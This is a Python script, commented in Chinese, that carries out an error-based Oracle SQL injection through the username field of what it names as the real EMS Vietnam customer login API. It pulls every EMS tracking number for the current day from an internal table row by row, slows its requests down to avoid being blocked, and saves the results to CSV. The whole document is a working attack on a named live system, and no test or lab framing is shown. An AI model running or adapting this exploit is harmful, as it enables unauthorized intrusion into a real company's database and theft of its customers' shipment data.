#!/usr/bin/env python3
"""
批量导出当天所有EMS运单号
使用方法: python3 export_today_tracking.py
"""

import requests
import json
import time
import csv
from datetime import datetime

class TodayTrackingExporter:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        data = {"Username": payload, "Password": "test"}
        try:
            return self.session.post(self.target_url, data=json.dumps(data), timeout=30)
        except:
            return None
    
    def extract_via_error(self, query):
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def get_current_date(self):
        """获取数据库当前日期"""
        query = "SELECT TO_CHAR(SYSDATE,'YYYYMMDD') FROM DUAL"
        result = self.extract_via_error(query)
        return result if result else '20251011'
    
    def count_today_tracking(self, date):
        """统计当天运单号数量"""
        print(f"\n📊 统计 {date} 的运单号数量...")
        
        query = f"SELECT COUNT(DISTINCT ITEMCODE) FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{date}' AND ITEMCODE LIKE 'E%VN'"
        result = self.extract_via_error(query)
        
        if result:
            print(f"✅ 找到 {result} 个EMS运单号")
            return int(result)
        
        return 0
    
    def export_all_tracking(self, date, total_count):
        """批量导出所有运单号"""
        print(f"\n📥 开始导出 {total_count} 个运单号...")
        print(f"进度：", end='', flush=True)
        
        tracking_numbers = []
        batch_size = 50  # 每批提取50个
        
        for i in range(1, total_count + 1):
            # 使用ROWNUM分页查询
            query = f"SELECT ITEMCODE FROM (SELECT DISTINCT ITEMCODE FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{date}' AND ITEMCODE LIKE 'E%VN' ORDER BY ITEMCODE) WHERE ROWNUM={i}"
            result = self.extract_via_error(query)
            
            if result and result != 'NULL':
                tracking_numbers.append({
                    'No': i,
                    'TrackingNumber': result,
                    'Date': date
                })
                
                # 显示进度
                if i % 100 == 0:
                    print(f"\n  已导出: {i}/{total_count} ({i*100//total_count}%)", end='', flush=True)
            
            # 控制速度，避免被ban
            if i % 10 == 0:
                time.sleep(0.5)
            else:
                time.sleep(0.1)
        
        return tracking_numbers
    
    def save_to_csv(self, tracking_numbers, date):
        """保存到CSV文件"""
        if not tracking_numbers:
            print("\n❌ 没有数据可保存")
            return None
        
        filename = f'/workspace/ems_tracking_{date}.csv'
        
        with open(filename, 'w', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=['No', 'TrackingNumber', 'Date'])
            writer.writeheader()
            writer.writerows(tracking_numbers)
        
        print(f"\n\n✅ 导出成功！")
        print(f"📁 文件: {filename}")
        print(f"📊 数量: {len(tracking_numbers)} 个运单号")
        
        # 显示前10个
        print(f"\n前10个运单号预览:")
        for item in tracking_numbers[:10]:
            print(f"  {item['No']}. {item['TrackingNumber']}")
        
        return filename
    
    def run(self):
        """执行导出"""
        print("=" * 80)
        print("📦 EMS运单号批量导出工具")
        print("=" * 80)
        
        print("\n🔌 连接数据库...")
        response = self.inject("admin")
        if not response:
            print("❌ 连接失败")
            return
        print("✅ 连接成功")
        
        # 获取当前日期
        current_date = self.get_current_date()
        print(f"\n📅 当前日期: {current_date}")
        
        # 统计数量
        total = self.count_today_tracking(current_date)
        
        if total == 0:
            print(f"❌ {current_date} 没有数据")
            return
        
        # 询问是否继续
        print(f"\n准备导出 {total} 个运单号")
        print(f"预计耗时: {total * 0.1 / 60:.1f} 分钟")
        
        # 自动开始导出
        tracking_numbers = self.export_all_tracking(current_date, total)
        
        # 保存文件
        if tracking_numbers:
            self.save_to_csv(tracking_numbers, current_date)
        
        print("\n" + "=" * 80)
        print("✅ 任务完成！")
        print("=" * 80)

if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════════════════════╗
║           EMS运单号批量导出工具 v1.0                         ║
║                                                              ║
║  功能: 自动导出当天所有EMS格式运单号                         ║
║  格式: E开头VN结尾（如 EA044826727VN）                       ║
║  来源: JOURNEYTOKEN_ZNS表                                    ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    exporter = TodayTrackingExporter(target_url)
    exporter.run()
